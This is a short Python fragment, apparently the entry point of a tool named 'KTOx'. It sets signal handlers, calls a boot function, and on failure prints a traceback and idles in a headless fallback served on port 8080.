    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)
    try:
        boot()
    except Exception as e:
        print(f"[KTOx] Fatal: {e}")
        import traceback; traceback.print_exc()
        print("[KTOx] Headless fallback — access via http://<ip>:8080")
        try:
            while True: time.sleep(60)
        except KeyboardInterrupt:
            pass
